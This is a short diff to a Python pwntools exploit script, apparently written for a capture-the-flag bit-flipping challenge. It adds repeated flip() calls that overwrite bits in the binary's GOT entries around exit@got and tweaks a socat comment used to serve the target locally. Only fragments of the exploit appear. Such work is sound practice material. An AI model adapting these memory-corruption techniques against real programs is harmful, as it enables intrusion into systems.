@@ -1,8 +1,9 @@
 # coding: utf-8
 from __future__ import print_function, division
 from pwn import *
+import random
 
-# socat TCP-L:3001,reuseaddr,fork EXEC:./execfile
+#t socat TCP-L:3001,reuseaddr,fork EXEC:./execfile
 
 
 is_gaibu = False
@@ -34,6 +35,7 @@ for i in range(100):
     exit_got = 0x601031
     dl_got = 0x601010
     flip(exit_got, 0)
+    flip(exit_got - 1, 0)
 
 
     #bits =  0b110001111100101001100110 #0x7fe37599e870 ^ 0x7fe375602216
@@ -55,6 +57,15 @@ for i in range(100):
             cnt += 1
 
 
+    flip(0, 8)
+    flip(0, 8)
+    flip(0, 8)
+    flip(0, 8)
+    flip(0, 8)
+    flip(0, 8)
+    flip(0, 8)
+
+    flip(exit_got - 1, 0)
     flip(exit_got, 0)
 
     try:
